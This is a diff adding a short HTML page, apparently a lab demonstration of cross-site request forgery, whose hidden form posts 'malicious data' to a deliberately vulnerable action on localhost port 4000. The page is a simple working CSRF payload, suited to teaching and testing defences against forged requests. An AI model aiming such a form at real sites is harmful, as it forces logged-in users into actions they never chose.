@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious CSRF Attack</title>
+</head>
+<body>
+    <h1>Simulating a CSRF Attack</h1>
+    <form action="http://localhost:4000/vulnerable-action" method="POST">
+        <input type="hidden" name="data" value="malicious data">
+        <button type="submit">Execute Malicious Action</button>
+    </form>
+</body>
+</html>
